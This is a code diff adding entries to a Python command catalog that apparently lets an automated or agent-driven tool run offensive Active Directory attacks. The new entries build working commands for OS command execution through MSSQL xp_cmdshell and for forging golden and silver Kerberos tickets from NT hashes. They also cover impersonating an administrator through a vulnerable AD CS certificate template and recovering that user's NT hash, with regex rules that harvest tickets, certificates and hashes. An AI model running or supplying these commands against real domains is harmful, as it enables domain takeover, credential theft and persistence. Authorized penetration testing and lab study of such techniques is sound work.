@@ -435,8 +435,10 @@ CATALOG: list[CommandSpec] = [
         parameters=_params({**_TARGET, **_DOMAIN, **_AUTH}, ["target", "domain", "username", "password"]),
         build_args=lambda k: ["find", "-u", f"{_s(k['username'])}@{_s(k['domain'])}",
                               "-p", _s(k["password"]), "-dc-ip", _s(k["target"]),
+                              "-ns", _s(k["target"]), "-dns-tcp",
                               "-stdout", "-vulnerable"],
-        aliases=["certipy"], timeout=600, install_hint="pipx install certipy-ad.",
+        aliases=["certipy"], timeout=600,
+        install_hint="pipx install certipy-ad (point DNS at a DC — the DC is the name server).",
     ),
     CommandSpec(
         name="bloodhound_python",
@@ -458,6 +460,80 @@ CATALOG: list[CommandSpec] = [
         build_args=lambda k: [f"{_s(k.get('domain','') )}/{_s(k['username'])}:"
                               f"{_s(k['password'])}@{_s(k['target'])}"],
         install_hint="pipx install impacket.",
+    ),
+    CommandSpec(
+        name="netexec_mssql",
+        description="Authenticate to MSSQL (1433) with NetExec using Windows or SQL "
+                    "auth, run a T-SQL query (-q) or an OS command via xp_cmdshell (-x, "
+                    "auto-enabled when the login is privileged). Turns a SQL foothold "
+                    "into command execution as the service account (then SYSTEM).",
+        binary="nxc", category="ad-smb",
+        parameters=_params({**_TARGET, **_AUTH_H, **_DOMAIN,
+            "query": {"type": "string", "description": "T-SQL query to run (optional)."},
+            "command": {"type": "string", "description": "OS command via xp_cmdshell (optional)."},
+            "local_auth": {"type": "string", "description": "'true' for a local SQL login instead of Windows auth."}},
+            ["target"]),
+        build_args=lambda k: ["mssql", _s(k["target"])] + _nxc_auth(k)
+                             + (["--local-auth"] if _s(k.get("local_auth", "")).lower()
+                                in ("true", "1", "yes") else [])
+                             + (["-q", _s(k["query"])] if k.get("query") else [])
+                             + (["-x", _s(k["command"])] if k.get("command") else []),
+        install_hint="pipx install netexec.",
+    ),
+    CommandSpec(
+        name="ticketer",
+        description="Forge a Kerberos ticket OFFLINE. Golden ticket: give the krbtgt NT "
+                    "hash for full-domain persistence. Silver ticket: give a service "
+                    "account's NT hash plus its SPN for access to one service. Writes "
+                    "<user>.ccache; export KRB5CCNAME to it and use -k with impacket/nxc.",
+        binary="impacket-ticketer", category="ad-smb", requires_host=False,
+        host_resolver=host_from_domain,
+        parameters=_params({**_DOMAIN,
+            "nthash": {"type": "string", "description": "NT hash: krbtgt (golden) or the service account (silver)."},
+            "domain_sid": {"type": "string", "description": "Domain SID, e.g. S-1-5-21-…."},
+            "username": {"type": "string", "description": "User to forge the ticket for (e.g. Administrator)."},
+            "spn": {"type": "string", "description": "Service SPN for a SILVER ticket (omit for golden)."}},
+            ["domain", "nthash", "domain_sid", "username"]),
+        build_args=lambda k: ["-nthash", _s(k["nthash"]), "-domain-sid", _s(k["domain_sid"]),
+                              "-domain", _s(k["domain"])]
+                             + (["-spn", _s(k["spn"])] if k.get("spn") else [])
+                             + [_s(k["username"])],
+        harvest=[HarvestRule("ccache", r"Saving ticket in\s+(\S+\.ccache)")],
+        install_hint="pipx install impacket.",
+    ),
+    CommandSpec(
+        name="certipy_req",
+        description="Request a certificate from a vulnerable AD CS template (ESC1/ESC2/…): "
+                    "with -upn you enroll a cert AS another user (e.g. administrator) and "
+                    "get their .pfx. Needs a domain credential and the CA + template names "
+                    "from certipy_find.",
+        binary="certipy-ad", category="ad-smb",
+        parameters=_params({**_TARGET, **_DOMAIN, **_AUTH,
+            "ca": {"type": "string", "description": "CA name (from certipy_find), e.g. SEVENKINGDOMS-CA."},
+            "template": {"type": "string", "description": "Vulnerable template name, e.g. ESC1."},
+            "upn": {"type": "string", "description": "User to impersonate, e.g. administrator@domain."}},
+            ["target", "domain", "username", "password", "ca", "template"]),
+        build_args=lambda k: ["req", "-u", f"{_s(k['username'])}@{_s(k['domain'])}",
+                              "-p", _s(k["password"]), "-dc-ip", _s(k["target"]),
+                              "-ns", _s(k["target"]), "-dns-tcp",
+                              "-ca", _s(k["ca"]), "-template", _s(k["template"])]
+                             + (["-upn", _s(k["upn"])] if k.get("upn") else []),
+        harvest=[HarvestRule("pfx", r"Saved certificate and private key to '([^']+\.pfx)'")],
+        aliases=["certipy"], timeout=600, install_hint="pipx install certipy-ad.",
+    ),
+    CommandSpec(
+        name="certipy_auth",
+        description="Authenticate with a certificate (.pfx from certipy_req) to recover "
+                    "the target user's NT hash and a Kerberos TGT — completing an AD CS "
+                    "ESC escalation to that user (often Domain Admin).",
+        binary="certipy-ad", category="ad-smb",
+        parameters=_params({**_TARGET,
+            "pfx": {"type": "string", "description": "Path to the .pfx from certipy_req."}},
+            ["target", "pfx"]),
+        build_args=lambda k: ["auth", "-pfx", _s(k["pfx"]), "-dc-ip", _s(k["target"]),
+                              "-ns", _s(k["target"]), "-dns-tcp"],
+        harvest=[HarvestRule("nthash", r"Got hash for '[^']+':\s*[a-f0-9]{32}:([a-f0-9]{32})")],
+        aliases=["certipy"], install_hint="pipx install certipy-ad.",
     ),
 
     # ---- Credentials -----------------------------------------------------
